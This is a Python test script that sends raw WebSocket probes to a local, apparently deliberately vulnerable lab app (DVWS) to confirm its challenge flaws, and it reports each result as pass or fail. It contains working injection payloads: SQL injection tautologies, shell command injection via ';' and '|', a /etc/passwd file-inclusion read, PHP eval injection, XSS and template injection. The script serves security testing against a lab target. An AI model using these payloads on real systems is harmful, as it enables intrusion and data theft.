#!/usr/bin/env python3
"""DVWS manual red-team probes — raw WS client, ZERO engine code.
Proves each DVWS challenge vulnerability LIVE before any engine work
(the campaign's RED-proven discipline). Every probe prints raw evidence.

Usage (stack must be up in the same call): python3 scripts/owsp/dvws_manual_probes.py
"""
import base64, json, socket, os, struct, sys

HOST, PORT = "127.0.0.1", 8080

class Ws:
    def __init__(self, path, origin="http://127.0.0.1:8888", timeout=8.0):
        self.s = socket.create_connection((HOST, PORT), timeout=timeout)
        key = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall((f"GET {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nUpgrade: websocket\r\n"
                        f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
                        f"Origin: {origin}\r\n\r\n").encode())
        resp = self.s.recv(4096).decode("latin1", "replace")
        assert " 101 " in resp.split("\r\n")[0], f"handshake failed: {resp[:120]}"
    def send(self, text):
        p = text.encode()
        m = os.urandom(4)
        h = bytearray([0x81]); n = len(p)
        if n < 126: h.append(0x80 | n)
        elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
        else: h.append(0x80 | 127); h += struct.pack(">Q", n)
        self.s.sendall(bytes(h) + m + bytes(b ^ m[i % 4] for i, b in enumerate(p)))
    def recv(self, wait=6.0):
        self.s.settimeout(wait)
        try:
            data = self.s.recv(65536)
        except socket.timeout:
            return None
        if not data or not (data[0] & 0x80):  # masked server frame? servers send unmasked
            return None
        op = data[0] & 0x0F
        if op not in (0x1, 0x0, 0x2):
            return None
        ln = data[1] & 0x7F; off = 2
        if ln == 126: ln = struct.unpack(">H", data[2:4])[0]; off = 4
        elif ln == 127: ln = struct.unpack(">Q", data[2:10])[0]; off = 10
        return data[off:off+ln].decode("utf-8", "replace")
    def close(self):
        try: self.s.close()
        except Exception: pass

def b64(s): return base64.b64encode(s.encode()).decode()

def probe(label, path, msg, expect=None, show=True):
    try:
        w = Ws(path)
        w.send(msg)
        r = w.recv()
        w.close()
    except Exception as e:
        print(f"[{label}] ERROR: {e}")
        return None
    print(f"[{label}] sent: {msg[:110]}")
    print(f"[{label}] reply: {str(r)[:220] if r is not None else '(no reply)'}")
    if expect and r and expect(r):
        print(f"[{label}] ==> ORACLE MATCH")
    print()
    return r

print("=" * 70)
print("DVWS MANUAL RED-TEAM PROBES — raw evidence, zero engine code")
print("=" * 70)

# 1) ERROR SQLi: /authenticate-user (auth_user/auth_pass base64-decoded server-side)
r = probe("sqli-error", "/authenticate-user",
          json.dumps({"auth_user": b64("admin' -- "), "auth_pass": b64("x")}),
          expect=lambda r: "SQL syntax" in r or "MariaDB" in r)

# control: valid login shape (no error)
probe("sqli-error-control", "/authenticate-user",
      json.dumps({"auth_user": b64("admin"), "auth_pass": b64("admin")}))

# 2) BLIND SQLi: /authenticate-user-blind — boolean oracle (tautology pair in auth_pass)
rt = probe("sqli-blind-TRUE", "/authenticate-user-blind",
           json.dumps({"auth_user": b64("admin"), "auth_pass": b64("x' or '1'='1")}),
           expect=lambda r: "Welcome" in r)
rf = probe("sqli-blind-FALSE", "/authenticate-user-blind",
           json.dumps({"auth_user": b64("admin"), "auth_pass": b64("x' or '1'='2")}),
           expect=lambda r: "Invalid" in r)
if rt and rf and ("Welcome" in rt) and ("Invalid" in rf) and rt != rf:
    print("[sqli-blind] ==> BOOLEAN DIFFERENTIAL PROVEN (Welcome vs Invalid)\n")

# 3) CONTROL (must NOT be SQLi): /authenticate-user-prepared
rp = probe("sqli-prepared-CONTROL", "/authenticate-user-prepared",
           json.dumps({"auth_user": b64("admin' or '1'='1"), "auth_pass": b64("x")}),
           expect=lambda r: False)

# 4) OS Command Injection: /command-execution (raw msg -> shell_exec ping -c 3 $msg)
CAN = "SENTINEL_CMDI_" + os.urandom(4).hex()[:8]
rc = probe("cmdi", "/command-execution", f"127.0.0.1; echo {CAN}",
           expect=lambda r: r and CAN in r)
CAN2 = "SENTINEL_CMDI2_" + os.urandom(4).hex()[:8]
probe("cmdi-pipe", "/command-execution", f"| echo {CAN2}", expect=lambda r: r and CAN2 in r)

# 5) File Inclusion: /file-inclusion (raw msg -> file_get_contents)
rfi = probe("lfi", "/file-inclusion", "/etc/passwd",
            expect=lambda r: r and ("root:" in r))
probe("lfi-rel", "/file-inclusion", "../../../../etc/hostname",
      expect=lambda r: r and len(r.strip()) > 0)

# 6) PHP Code Injection: /php-code-injection (raw msg -> eval('return '.$msg.';'))
rce = probe("code-inj", "/php-code-injection", "40+2", expect=lambda r: r and "42" in r)

# 7) Reflected XSS: /reflected-xss (raw msg -> "Hello ".$msg)
XSS = f"<img src=x onerror=alert(1)>{'S'*8}"
rx = probe("xss-reflected", "/reflected-xss", XSS,
           expect=lambda r: r and "<img src=x onerror=alert(1)>" in r)

# 8) SSTI (Twig): /ssti (raw msg -> Twig render)
rs = probe("ssti", "/ssti", "{{7*7}}", expect=lambda r: r and "49" in r)

# 9) Stored XSS: post-comment (INSERT) then show-comments (SELECT)
MK = "SENTINEL_STORED_" + os.urandom(4).hex()[:8]
probe("xss-stored-POST", "/post-comments",
      json.dumps({"name": MK, "comment": f"<b id={MK}>stored-marker</b>"}))
rsx = probe("xss-stored-READ", "/show-comments", "{}",
            expect=lambda r: r and MK in r)

# 10) channel-shape probe: what do the other channels answer?
for ch in ("show-comments", "change-password", "authenticate-user-prepared-session"):
    probe("shape", "/" + ch, json.dumps({"x": "1"}))
    break  # change-password is destructive — NEVER probed (only shape-safe channels)

print("=" * 70)
print("SUMMARY")
print("=" * 70)
checks = {
    "sqli-error oracle": r is not None and ("SQL" in (r or "") or "MariaDB" in (r or "")),
    "sqli-blind differential": bool(rt and rf and rt != rf),
    "cmdi canary": bool(rc and CAN in rc),
    "lfi passwd": bool(rfi and "root:" in rfi),
    "code-inj eval": bool(rce and "42" in rce),
    "xss-reflected": bool(rx and "onerror=alert(1)" in rx),
    "ssti evaluation": bool(rs and "49" in rs),
    "xss-stored roundtrip": bool(rsx and MK in rsx),
    "prepared CONTROL (no sqli leak)": bool(rp and "Welcome" not in (rp or "") or (rp and "Invalid" in rp)),
}
for k, v in checks.items():
    print(f"  {'PASS' if v else 'FAIL'}  {k}")
print()
print("ALL:", sum(checks.values()), "/", len(checks))
